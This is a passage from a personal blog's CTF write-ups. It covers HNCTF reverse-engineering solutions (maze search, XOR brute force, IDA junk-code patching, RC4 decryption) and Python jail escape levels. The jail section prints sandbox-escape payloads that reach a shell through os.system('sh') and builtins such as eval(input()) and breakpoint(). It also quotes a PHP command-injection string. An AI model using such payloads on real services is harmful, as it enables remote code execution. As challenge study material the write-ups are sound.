+    if map1[x-1][y] == 0 and map2[x-1][y] == 0:
+        map2[x][y] = 1
+        flag += &#39;w&#39;
+        DFS(x-1,y)
+        flag = flag[:-1]
+        map2[x][y] = 0
+    if map1[x][y+1] == 0 and map2[x][y+1] == 0:
+        map2[x][y] = 1
+        flag += &#39;d&#39;
+        DFS(x,y+1)
+        flag = flag[:-1]
+        map2[x][y] = 0
+    if map1[x][y-1] == 0 and map2[x][y-1] == 0:
+        map2[x][y] = 1
+        flag += &#39;a&#39;
+        DFS(x,y-1)
+        flag = flag[:-1]
+        map2[x][y] = 0
+y=1
+x=1
+DFS(x,y)
+</code></pre>
+<h3 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h3><h5 id="Gets-a-exe-file-check-whether-shell-exists"><a href="#Gets-a-exe-file-check-whether-shell-exists" class="headerlink" title="Gets a .exe file, check whether shell exists."></a>Gets a .exe file, check whether shell exists.</h5><p><img src="/2022/11/02/hnctfRe/findItShell.png" alt="shell"></p>
+<h5 id="Open-it-with-ida"><a href="#Open-it-with-ida" class="headerlink" title="Open it with ida."></a>Open it with ida.</h5><p><img src="/2022/11/02/hnctfRe/finditIda_1.png" alt="ida1"><br><img src="/2022/11/02/hnctfRe/finditIda_2.png" alt="ida2"><br><img src="/2022/11/02/hnctfRe/finditIda_3.png" alt="ida3"></p>
+<h5 id="A-complex-encryption-The-key-and-the-flag-both-needs-to-be-brute-forces-out-I-shall-do-a-emersion-later…"><a href="#A-complex-encryption-The-key-and-the-flag-both-needs-to-be-brute-forces-out-I-shall-do-a-emersion-later…" class="headerlink" title="A complex encryption. The key and the flag both needs to be brute forces out. I shall do a emersion later…"></a>A complex encryption. The key and the flag both needs to be brute forces out. I shall do a emersion later…</h5><h5 id="Official-wp"><a href="#Official-wp" class="headerlink" title="Official wp:"></a>Official wp:</h5><pre><code>mid=[32,59,121,60,125,45,32,17,38,0,43,45,48,48,28,42,11,20,49,100,63,119,103,53,173,46,136,158,49,78,78,176]
+enc=[29,70,92,84,87,19,61,43,62,60,29,9,18,63,6,6,42,14,124,110,109,60,105,191,7,162,64,104,92,61,223,179]
+flag=[0]*32
+flag[31]=179
+flag[30]=223
+print(flag)
+#th1s_3ncryt_is_s0_e@sy!1
+key = [ord(i) for i in &quot;HN_CTF&quot;]
+def decrypt(arr):
+    for i in range(0,len(arr)//4):
+        tmp = arr[4*i:4*i+4]
+        st = &quot;&quot;
+        st+=chr(tmp[3]^key[i%6])
+        st+=chr(tmp[0]^key[i%6])
+        st+=chr(tmp[2]^key[i%6])
+        st+=chr(tmp[1]^key[i%6])
+        print(st,end=&#39;&#39;)
+    print()   
+    pass
+def dfs(deep):
+    global flag
+    if(deep==0):
+        decrypt(flag)
+    else:
+        for i in range(0,0xff):
+            if( enc[deep-1] == (0x12+deep-1)^ ((i+12)%24 )^ i ^ flag[deep]):
+                flag[deep-1] = i
+                dfs(deep-1)
+dfs(31)
+</code></pre>
+<h3 id="flower"><a href="#flower" class="headerlink" title="flower"></a>flower</h3><h5 id="From-ida-there-are-a-lot-of-junkcodes-inside-and-we-have-to-patch-them-before-I-can-analyze-the-code"><a href="#From-ida-there-are-a-lot-of-junkcodes-inside-and-we-have-to-patch-them-before-I-can-analyze-the-code" class="headerlink" title="From ida, there are a lot of junkcodes inside, and we have to patch them before I can analyze the code."></a>From ida, there are a lot of junkcodes inside, and we have to patch them before I can analyze the code.</h5><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1512089-1-1.html">junkcode</a></p>
+<h5 id="Some-script-to-nop-the-junkcodes"><a href="#Some-script-to-nop-the-junkcodes" class="headerlink" title="Some script to nop the junkcodes:"></a>Some script to nop the junkcodes:</h5><p><img src="/2022/11/02/hnctfRe/flower_junkcode_1.png" alt="junkcode1"></p>
+<h5 id="scripts1"><a href="#scripts1" class="headerlink" title="scripts1:"></a>scripts1:</h5><pre><code>import idc
+import idautils
+start =0x00401000
+end = 0x00401401
+bad=[0x75,0x02,0x74,0x01,0xc7]
+
+for i in range(start,end):
+    if idc.get_wide_byte(i) == 0x75:
+        flag=1
+        for j in range(len(bad)):
+            if(idc.get_wide_byte(i+j)!= bad[j]):
+                flag=0
+                break
+        if flag==1:
+            for j in range(len(bad)):
+                patch_byte(i+j,0x90)
+                print(&quot;success&quot;)
+</code></pre>
+<h5 id="scripts2"><a href="#scripts2" class="headerlink" title="scripts2:"></a>scripts2:</h5><p><img src="/2022/11/02/hnctfRe/flower_junkcode_2.png" alt="junkcode2"></p>
+<pre><code>import idc
+import idautils
+start =0x00401000
+end = 0x00401401
+bad=[0xe8,0x01,0x00,0x00,0x00,0xe8,0x36,0x83,0x04,0x24,0x08,0xc3,0xe8]
+
+for i in range(start,end):
+    if idc.get_wide_byte(i) == 0xe8:
+        flag=1
+        for j in range(len(bad)):
+            if(idc.get_wide_byte(i+j)!= bad[j]):
+                flag=0
+                break
+        if flag==1:
+            for j in range(len(bad)):
+                patch_byte(i+j,0x90)
+                print(&quot;success&quot;)
+</code></pre>
+<h6 id="Some-interlude"><a href="#Some-interlude" class="headerlink" title="Some interlude:"></a>Some interlude:</h6><p><img src="/2022/11/02/hnctfRe/flowerPDF.png" alt="PDF"></p>
+<h5 id="Anyway-the-uncompilation-shall-look-like-this"><a href="#Anyway-the-uncompilation-shall-look-like-this" class="headerlink" title="Anyway, the uncompilation shall look like this:"></a>Anyway, the uncompilation shall look like this:</h5><p><img src="/2022/11/02/hnctfRe/flowerIda.png" alt="ida"></p>
+<h5 id="The-encrypt-function"><a href="#The-encrypt-function" class="headerlink" title="The encrypt function:"></a>The encrypt function:</h5><p><img src="/2022/11/02/hnctfRe/flowerEncrypt.png" alt="encrypt"></p>
+<h5 id="Now-we-get-the-encryption-we-can-know-that-it-is-a-RC4-encryption-and-here-comes-the-official-exp"><a href="#Now-we-get-the-encryption-we-can-know-that-it-is-a-RC4-encryption-and-here-comes-the-official-exp" class="headerlink" title="Now we get the encryption, we can know that it is a RC4- encryption, and here comes the official exp:"></a>Now we get the encryption, we can know that it is a RC4- encryption, and here comes the official exp:</h5><pre><code>#include &lt;iostream&gt;
+using namespace std;
+unsigned int ar[40] = &#123; 0x4d,0xffffffe6,0x49,0xffffff95,0x3,0x2d,0x2b,0xffffffba,0xffffffea,0x6d,0xffffffff,0x59,0x70,0x0,0x1b,0xffffffa9,0x2c,0xffffffb0,0x32,0xffffff98,0x6f,0xffffff8c,0x56,0xffffffa2,0x4c,0x79,0x7f &#125;;
+// c[i]_ = c[i]^c[(i+1)%27]
+// c[26]_ = c[26]^c_[0]
+unsigned char st[16] = &quot;Hello_Ctfers!!!&quot;;
+void O0oo00OOo00o0(unsigned char *m, int mlen, int keylen) &#123;
+        unsigned char s[256];
+        unsigned char t[256];
+        int i;
+        for ( i = 0; i &lt; 256; i++) &#123; //初始化s和t向量 
+                s[i] = i;
+                t[i] = st[i%keylen];
+        &#125;        
+        int j = 0;
+        for ( i = 0; i &lt; 256; i++) &#123;
+                j = (j + s[i] + t[i]) % 256;
+                swap(s[i],s[j]);
+                //根据t向量打乱s盒 
+        &#125;
+        unsigned char k[64];//保存秘钥流，或者直接进行异或 
+        i = 0; j = 0; 
+        int tmp;
+        int index ;
+        for ( index = 0; index &lt; mlen; index++) &#123;   //生成与明文长度一致的秘钥流 
+                i = (i + 3) % 256;
+                j = (j + s[i]+1) % 256;
+                swap(s[i],s[j]); 
+                tmp = (s[i] + s[j]) % 256;
+                k[index] = s[tmp];//保存秘钥 
+        &#125;
+        for (i = 0; i &lt; mlen; i++)
+        &#123;
+                m[i] = m[i] ^ k[i];//主要进行了一步异或，加密的逆过程就是解密 
+        &#125;
+&#125;
+int main()
+&#123;
+        char c[27]=&#123;0x4d,0xffffffe6,0x49,0xffffff95,0x3,0x2d,0x2b,0xffffffba,0xffffffea,0x6d,0xffffffff,0x59,0x70,0x0,0x1b,0xffffffa9,0x2c,0xffffffb0,0x32,0xffffff98,0x6f,0xffffff8c,0x56,0xffffffa2,0x4c,0x79,0x7f &#125;;
+        int i;
+        for(i=26;i&gt;=0;i--)
+        &#123;
+                c[i] = c[(i+1)%27]^c[i];
+        &#125;
+        for(i=0;i&lt;27;i++)
+        &#123;
+                printf(&quot;0x%x,&quot;,c[i]) ;
+        &#125;
+        O0oo00OOo00o0((unsigned char *)c,27,16);
+        printf(&quot;\n&quot;);
+                for(i=0;i&lt;27;i++)
+        &#123;
+                printf(&quot;%c&quot;,c[i]&amp;0xff) ;
+        &#125;
+&#125;
+</code></pre>
+<h5 id="It-base-on-static-crack-here-but-a-bro-told-me-that-since-there-is-only-ONE-XOR-that-really-do-something-to-your-flag-you-can-dynamic-debug-to-get-the-array-v4-in-the-upper-encryption-photograth-Which-is-really-genius-because-whether-you-know-how-to-decrypt-rc4-or-not-you-can-solve-this-problem-and-it-do-save-you-tons-of-work"><a href="#It-base-on-static-crack-here-but-a-bro-told-me-that-since-there-is-only-ONE-XOR-that-really-do-something-to-your-flag-you-can-dynamic-debug-to-get-the-array-v4-in-the-upper-encryption-photograth-Which-is-really-genius-because-whether-you-know-how-to-decrypt-rc4-or-not-you-can-solve-this-problem-and-it-do-save-you-tons-of-work" class="headerlink" title="It base on static crack here, but a bro told me that since there is only ONE XOR that really do something to your flag, you can dynamic debug to get the array v4. (in the upper encryption photograth) Which is really genius because whether you know how to decrypt rc4 or not you can solve this problem and it do save you tons of work!"></a>It base on static crack here, but a bro told me that since there is only <c style="color: #FF0000;">ONE</c> <code>XOR</code> that really do something to your flag, you can dynamic debug to get the array <code>v4</code>. (in the upper encryption photograth) Which is really genius because whether you know how to decrypt rc4 or not you can solve this problem and it do save you tons of work!</h5><h6 id="Just-input-a-series-of-‘1’-and-look-into-the-ECX-register"><a href="#Just-input-a-series-of-‘1’-and-look-into-the-ECX-register" class="headerlink" title="Just input a series of ‘1’ and look into the ECX register!"></a>Just input a series of ‘1’ and look into the <code>ECX</code> register!</h6><p><img src="/2022/11/02/hnctfRe/dynamic_1.png" alt="dynamic_1"><br><img src="/2022/11/02/hnctfRe/dynamic_2.png" alt="dynamic_2"><br><img src="/2022/11/02/hnctfRe/dynamic_3.png" alt="dynamic_3"><br><img src="/2022/11/02/hnctfRe/dynamic_4.png" alt="dynamic_4"><br><img src="/2022/11/02/hnctfRe/dynamic_5.png" alt="dynamic_5"></p>
+<h5 id="And-so-on…"><a href="#And-so-on…" class="headerlink" title="And so on…"></a>And so on…</h5><pre><code>###### Two thinkings(should be tried out later):
+###### Can `angr` solve `rc4` immediately?
+###### Can I add a `hook` so it prints the `ECX` rightaway and I don&#39;t need to check it once and once again?
+######                                                                                          --2022.11.4
+</code></pre>
+<h4 id="From-here-the-last-few-problems-are-quite-hard…"><a href="#From-here-the-last-few-problems-are-quite-hard…" class="headerlink" title="From here, the last few problems are quite hard…"></a>From here, the last few problems are quite hard…</h4><h3 id="MAZE"><a href="#MAZE" class="headerlink" title="MAZE"></a>MAZE</h3><h5 id="We-found-thounds-of-junkcodes-here-and-we-nop-them"><a href="#We-found-thounds-of-junkcodes-here-and-we-nop-them" class="headerlink" title="We found thounds of junkcodes here, and we nop them:"></a>We found thounds of junkcodes here, and we nop them:</h5><pre><code>import idc
+import idautils
+start =0x00140001000
+end = 0x00140CEF1F0
+bad=[0x50,0x48,0x0f,0xc7,0xf0,0x58]
+
+for i in range(start,end):
+    if idc.get_wide_byte(i) == 0x50:
+        flag=1
+        for j in range(len(bad)):
+            if(idc.get_wide_byte(i+j)!= bad[j]):
+                flag=0
+                break
+        if flag==1:
+            for j in range(len(bad)):
+                patch_byte(i+j,0x90)
+                print(&quot;success&quot;)
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/ctf/" style="color: #00bcd4">
+                ctf
+            </a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/reverse/" style="color: #00bcd4">
+                reverse
+            </a>
+        </span>
+        
+    </div>
+    <a href="/2022/11/02/hnctfRe/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
+    <a href="/2022/11/01/pythonJail/">
+        <h2>
+            pythonJail
+        </h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2022/11/1
+        </span>
+    </div>
+    <div class="excerpt">
+        <div class="content" v-pre>
+            
+            <h4 id="preface"><a href="#preface" class="headerlink" title="preface"></a>preface</h4><h5 id="Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail"><a href="#Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail" class="headerlink" title="Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problemspythonJail."></a>Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">pythonJail</a>.</h5><h3 id="LEVEL-1"><a href="#LEVEL-1" class="headerlink" title="LEVEL 1"></a>LEVEL 1</h3><p><img src="/2022/11/01/pythonJail/level1.png" alt="level1"></p>
+<h5 id="From-the-function-filter-we-sees-that-the-symbol-“-‘-i-b-is-banned-Which-means-Show-subclasses-with-tuple-class-base-subclasses"><a href="#From-the-function-filter-we-sees-that-the-symbol-“-‘-i-b-is-banned-Which-means-Show-subclasses-with-tuple-class-base-subclasses" class="headerlink" title="From the function filter, we sees that the symbol [“ ‘ ` i b] is banned. Which means (Show subclasses with tuple)  ().\__class\__.\__base\__.\__subclasses\__()"></a>From the function filter, we sees that the symbol [“ ‘ ` i b] is banned. Which means (Show subclasses with tuple) <code> ().\__class\__.\__base\__.\__subclasses\__()</code></h5><h5 id="is-not-allowed-What’s-more-symbol-‘-and-“-is-banned-so-it-come-to-us-that-we-may-can-use-chr-to-splicing-a-string-that-we-wanted"><a href="#is-not-allowed-What’s-more-symbol-‘-and-“-is-banned-so-it-come-to-us-that-we-may-can-use-chr-to-splicing-a-string-that-we-wanted" class="headerlink" title="is not allowed. What’s more, symbol ‘ and “ is banned, so it come to us that we may can use chr to splicing a string that we wanted."></a>is not allowed. What’s more, symbol ‘ and “ is banned, so it come to us that we may can use <code>chr</code> to splicing a string that we wanted.</h5><h5 id="Two-possible-payload"><a href="#Two-possible-payload" class="headerlink" title="Two possible payload:"></a>Two possible payload:</h5><blockquote>
+<p>getattr(getattr(getattr(getattr(()._<em>class_</em>,c),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))<br>(().<em>_class</em><em>.__base</em><em>.__subclasses__()[-4].__init__.__globals</em>_<a href="'sh'">‘system’</a>)</p>
+</blockquote>
+<blockquote>
+<p>open(chr(102)+chr(108)+chr(97)+chr(103)).read()</p>
+</blockquote>
+<h5 id="from-thisBlog"><a href="#from-thisBlog" class="headerlink" title="from thisBlog"></a>from <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578986988">thisBlog</a></h5><p><img src="/2022/11/01/pythonJail/level1wp.png" alt="level1pos"></p>
+<h3 id="LEVEL-2"><a href="#LEVEL-2" class="headerlink" title="LEVEL 2"></a>LEVEL 2</h3><p><img src="/2022/11/01/pythonJail/level2.png" alt="level1"></p>
+<h5 id="The-length-of-the-payload-is-limited-to-13"><a href="#The-length-of-the-payload-is-limited-to-13" class="headerlink" title="The length of the payload is limited to 13."></a>The length of the payload is limited to 13.</h5><h5 id="The-answer-according-to-空白-is-the-function-“breakpoint-”-which-I-didn’t-figure-out-yet-However-there-is-another-way-Use-eval-input-so-that-the-program-receive-once-again-for-your-input-Seems-a-little-bit-like-cmd-system-POST-1-1-ls-to-escape-the-filter-in-php-right"><a href="#The-answer-according-to-空白-is-the-function-“breakpoint-”-which-I-didn’t-figure-out-yet-However-there-is-another-way-Use-eval-input-so-that-the-program-receive-once-again-for-your-input-Seems-a-little-bit-like-cmd-system-POST-1-1-ls-to-escape-the-filter-in-php-right" class="headerlink" title="The answer according to 空白 is the function “breakpoint()”, which I didn’t figure out yet. However, there is another way. Use eval(input()) so that the program receive once again for your input! Seems a little bit like /?cmd=system($_POST[1]);$1=ls to escape the filter in php right?"></a>The answer according to 空白 is the function <c style="color: #FF0000">“breakpoint()”</c>, which I didn’t figure out yet. However, there is another way. Use <code>eval(input())</code> so that the program receive once again for your input! Seems a little bit like <code>/?cmd=system($_POST[1]);$1=ls</code> to escape the filter in php right?</h5><h3 id="LEVEL-3"><a href="#LEVEL-3" class="headerlink" title="LEVEL 3"></a>LEVEL 3</h3><p><img src="/2022/11/01/pythonJail/level3.png" alt="level3"></p>
+<h5 id="This-time-the-maximum-length-of-our-payload-is-down-to-7"><a href="#This-time-the-maximum-length-of-our-payload-is-down-to-7" class="headerlink" title="This time, the maximum length of our payload is down to 7."></a>This time, the maximum length of our payload is down to 7.</h5><h5 id="I-didn’t-quite-understand-yet-but-function-help-can-help-you-passby-the-7-words-limit-Here-is-when-I-tried-others’-payload-quite-amazing-and-when-I-am-available-I-shall-come-back-to-study-it"><a href="#I-didn’t-quite-understand-yet-but-function-help-can-help-you-passby-the-7-words-limit-Here-is-when-I-tried-others’-payload-quite-amazing-and-when-I-am-available-I-shall-come-back-to-study-it" class="headerlink" title="I didn’t quite understand yet, but function help() can help you passby the 7 words limit. Here is when I tried others’ payload, quite amazing and when I am available I shall come back to study it."></a>I didn’t quite understand yet, but function <code>help()</code> can help you passby the 7 words limit. Here is when I tried others’ payload, quite amazing and when I am available I shall come back to study it.</h5><blockquote>
+</blockquote>
+<p><img src="/2022/11/01/pythonJail/level3wp.png" alt="level3"></p>
+<h3 id="PYTHON2-INPUT-JAIL"><a href="#PYTHON2-INPUT-JAIL" class="headerlink" title="PYTHON2 INPUT JAIL"></a>PYTHON2 INPUT JAIL</h3><p><img src="/2022/11/01/pythonJail/input(jail).png" alt="input(jail)"></p>
+<h5 id="python2-another-thing-I-am-not-familiar-with…"><a href="#python2-another-thing-I-am-not-familiar-with…" class="headerlink" title="python2, another thing I am not familiar with…"></a>python2, another thing I am not familiar with…</h5><h5 id="Looking-up-others’-write-up…"><a href="#Looking-up-others’-write-up…" class="headerlink" title="Looking up others’ write up…"></a>Looking up others’ write up…</h5><p><img src="/2022/11/01/pythonJail/input(jail)wp.png" alt="input(jail)"></p>
+<h3 id="LEVEL-2-5"><a href="#LEVEL-2-5" class="headerlink" title="LEVEL 2.5"></a>LEVEL 2.5</h3><p><img src="/2022/11/01/pythonJail/level2.5.png" alt="level2.5"></p>
+<h5 id="We-can-use-breakpoint-to-go-into-pdb-and-rce-is-possible"><a href="#We-can-use-breakpoint-to-go-into-pdb-and-rce-is-possible" class="headerlink" title="We can use breakpoint() to go into pdb, and rce is possible."></a>We can use <code>breakpoint()</code> to go into pdb, and rce is possible.</h5><h3 id="LAKE"><a href="#LAKE" class="headerlink" title="LAKE"></a>LAKE</h3><p><img src="/2022/11/01/pythonJail/lake.png" alt="lake"></p>
+<h6 id="Strange-christen-Crazyman-seems-to-name-it-‘lake’-from-‘leak’"><a href="#Strange-christen-Crazyman-seems-to-name-it-‘lake’-from-‘leak’" class="headerlink" title="Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)"></a>Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)</h6><h5 id="Use-globals-to-leak-the-key-And-then-get-shell"><a href="#Use-globals-to-leak-the-key-And-then-get-shell" class="headerlink" title="Use globals() to leak the key. And then get shell."></a>Use <code>globals()</code> to leak the key. And then get shell.</h5><h3 id="L-KE"><a href="#L-KE" class="headerlink" title="L@KE"></a>L@KE</h3><p><img src="/2022/11/01/pythonJail/l@ke.png" alt="l@ke"></p>
+<h6 id="Another-strange-christen…"><a href="#Another-strange-christen…" class="headerlink" title="Another strange christen…"></a>Another strange christen…</h6><h5 id="The-maxinum-length-of-payload-is-now-6-so-only-help-is-possible"><a href="#The-maxinum-length-of-payload-is-now-6-so-only-help-is-possible" class="headerlink" title="The maxinum length of payload is now 6, so only help() is possible."></a>The maxinum length of payload is now 6, so only <code>help()</code> is possible.</h5><h5 id="But-unlike-cases-above-this-time-module-‘os’-is-destory-or-whatever-Now-we-comes-to-the-base-reason-why-we-use-‘os’-above-help-can-actually-get-you-into-any-module-in-the-python-file-which-includes-main-And-surely-the-key-can-be-found-inside"><a href="#But-unlike-cases-above-this-time-module-‘os’-is-destory-or-whatever-Now-we-comes-to-the-base-reason-why-we-use-‘os’-above-help-can-actually-get-you-into-any-module-in-the-python-file-which-includes-main-And-surely-the-key-can-be-found-inside" class="headerlink" title="But unlike cases above, this time module ‘os’ is destory or whatever. Now we comes to the base reason why we use ‘os’ above. help() can actually get you into any module in the python file, which includes __main__! And surely, the key can be found inside."></a>But unlike cases above, this time module ‘os’ is destory or whatever. Now we comes to the base reason why we use ‘os’ above. <code>help()</code> can actually get you into any module in the python file, which includes <code>__main__</code>! And surely, the key can be found inside.</h5><br>
+#### OK, now we've go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.
+<br>
+
+
+<h3 id="LEVEL-5"><a href="#LEVEL-5" class="headerlink" title="LEVEL 5"></a>LEVEL 5</h3><p><img src="/2022/11/01/pythonJail/level5.png" alt="level5"></p>
+<h5 id="Just-rce-can-give-you-the-flag-unexpected-Later-we-will-see-how-it-shall-really-be-work-out"><a href="#Just-rce-can-give-you-the-flag-unexpected-Later-we-will-see-how-it-shall-really-be-work-out" class="headerlink" title="Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out."></a>Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out.</h5><h3 id="LEVEL-4"><a href="#LEVEL-4" class="headerlink" title="LEVEL 4"></a>LEVEL 4</h3><h6 id="Why-is-it-4-after-5-I-don’t-know…"><a href="#Why-is-it-4-after-5-I-don’t-know…" class="headerlink" title="(Why is it 4 after 5 I don’t know…)"></a>(Why is it 4 after 5 I don’t know…)</h6><h5 id="4-bytes-rce-seems-impossible-so-lets-just-guass-it-use-os-system-input-data-to-get-your-input-and-bingo"><a href="#4-bytes-rce-seems-impossible-so-lets-just-guass-it-use-os-system-input-data-to-get-your-input-and-bingo" class="headerlink" title="4 bytes rce, seems impossible, so lets just guass it use os.system(input_data) to get your input and bingo."></a>4 bytes rce, seems impossible, so lets just guass it use <code>os.system(input_data)</code> to get your input and bingo.</h5><p><img src="/2022/11/01/pythonJail/level4.png" alt="level4"></p>
+<h3 id="LAkE"><a href="#LAkE" class="headerlink" title="LAkE"></a>LAkE</h3><p><img src="/2022/11/01/pythonJail/laKelaKe.png" alt="laKe"></p>
+<h5 id="This-time-it-imports-sys-module-with-audit-hook-and-direct-RCE-function-like-pty-spawn、os-system、os-exec、os-posix-spawn、os-spawn、subprocess-Popen-is-not-available-Whats-more-compile、eval、exec、open-is-unfetchable-However-there-use-random-setstate-to-generate-its-random-number-which-is-base-on-Mersenne-Twister-and-is-crackable-In-general-if-we-got-the-state-of-the-random-number-generator-we-can-generate-the-same-number-That-leads-two-problems-There-is-only-one-‘eval’-in-the-server-code-but-we-need-to-execute-more-How-to-restore-the-state-BEFORE-the-random-number-is-generated"><a href="#This-time-it-imports-sys-module-with-audit-hook-and-direct-RCE-function-like-pty-spawn、os-system、os-exec、os-posix-spawn、os-spawn、subprocess-Popen-is-not-available-Whats-more-compile、eval、exec、open-is-unfetchable-However-there-use-random-setstate-to-generate-its-random-number-which-is-base-on-Mersenne-Twister-and-is-crackable-In-general-if-we-got-the-state-of-the-random-number-generator-we-can-generate-the-same-number-That-leads-two-problems-There-is-only-one-‘eval’-in-the-server-code-but-we-need-to-execute-more-How-to-restore-the-state-BEFORE-the-random-number-is-generated" class="headerlink" title="This time it imports sys module with audit hook, and direct RCE function like pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen is not available. Whats more, compile、eval、exec、open is unfetchable. However, there use random.setstate() to generate its random number, which is base on Mersenne Twister, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one ‘eval’ in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?"></a>This time it imports <code>sys</code> module with <a target="_blank" rel="noopener" href="https://peps.python.org/pep-0578/">audit hook</a>, and direct RCE function like <code>pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen</code> is not available. Whats more, <code>compile、eval、exec、open</code> is unfetchable. However, there use <code>random.setstate()</code> to generate its random number, which is base on Mersenne <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-tw/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95">Twister</a>, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one ‘eval’ in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?</h5><h5 id="First-we-need-to-know-a-thing-named-Assignment-Expresions-in-python-or-rather-walrus-operator-Then-we-package-those-formula-in-a-list-They-will-be-calculate-from-left-to-right-As-for-function-we-can-replace-it-with-lambda-Some-case-can-be-view-below"><a href="#First-we-need-to-know-a-thing-named-Assignment-Expresions-in-python-or-rather-walrus-operator-Then-we-package-those-formula-in-a-list-They-will-be-calculate-from-left-to-right-As-for-function-we-can-replace-it-with-lambda-Some-case-can-be-view-below" class="headerlink" title="First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with lambda. Some case can be view below:"></a>First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with <code>lambda</code>. Some case can be view below:</h5><pre><code>https://ctftime.org/writeup/21982
+
+https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#operators-and-short-tricks
+</code></pre>
+<h5 id="Second-if-we-import-random-and-print-random-getstate-at-the-beginning-we-got-a-tuple-back-which-may-look-like-3-624-None-The-first-value-‘3’-and-the-last-value-‘None’-is-fixed-Only-624-numbers-in-the-middle-is-changed-So-if-we-assign-the-conter-zero-we-get-the-random-number"><a href="#Second-if-we-import-random-and-print-random-getstate-at-the-beginning-we-got-a-tuple-back-which-may-look-like-3-624-None-The-first-value-‘3’-and-the-last-value-‘None’-is-fixed-Only-624-numbers-in-the-middle-is-changed-So-if-we-assign-the-conter-zero-we-get-the-random-number" class="headerlink" title="Second, if we import random and print random.getstate at the beginning, we got a tuple back. which may look like:(3, (..., 624), None). The first value ‘3’ and the last value ‘None’ is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number."></a>Second, if we <code>import random</code> and print <code>random.getstate</code> at the beginning, we got a tuple back. which may look like:<code>(3, (..., 624), None)</code>. The first value ‘3’ and the last value ‘None’ is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number.</h5><h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><pre><code>[random:=\_\_import__(&#39;random&#39;), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
+</code></pre>
+<h3 id="LEVEL-5-1"><a href="#LEVEL-5-1" class="headerlink" title="LEVEL 5.1"></a>LEVEL 5.1</h3><h5 id="Dued-to-the-unexpected-solves-in-level5-crazyman-gives-another-problem-stating-level5-1"><a href="#Dued-to-the-unexpected-solves-in-level5-crazyman-gives-another-problem-stating-level5-1" class="headerlink" title="Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1."></a>Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1.</h5><h5 id="nc-and-dir-as-it-tells-you-to-found-my-flag-try-list-getattr-my-flag-39-flag-got-a-AttributeError-39-flag-level5-39-object-has-no-attribute-39-flag-39-So-payload-is-list-getattr-my-flag-39-flag-level5-39"><a href="#nc-and-dir-as-it-tells-you-to-found-my-flag-try-list-getattr-my-flag-39-flag-got-a-AttributeError-39-flag-level5-39-object-has-no-attribute-39-flag-39-So-payload-is-list-getattr-my-flag-39-flag-level5-39" class="headerlink" title="nc and dir()(as it tells you to), found my_flag, try list(getattr(my_flag,&#39;flag)), got a AttributeError: &#39;flag_level5&#39; object has no attribute &#39;flag&#39;. So payload is list(getattr(my_flag,&#39;flag_level5&#39;))"></a><code>nc</code> and <code>dir()</code>(as it tells you to), found <code>my_flag</code>, try <code>list(getattr(my_flag,&#39;flag))</code>, got a <code>AttributeError: &#39;flag_level5&#39; object has no attribute &#39;flag&#39;</code>. So payload is <code>list(getattr(my_flag,&#39;flag_level5&#39;))</code></h5><h5 id="Another-way-to-solve-this-problem-though-quite-similar-the-latter-gets-its-shell"><a href="#Another-way-to-solve-this-problem-though-quite-similar-the-latter-gets-its-shell" class="headerlink" title="Another way to solve this problem(though quite similar, the latter gets its shell)"></a>Another way to solve this problem(though quite similar, the latter gets its shell)</h5><p><img 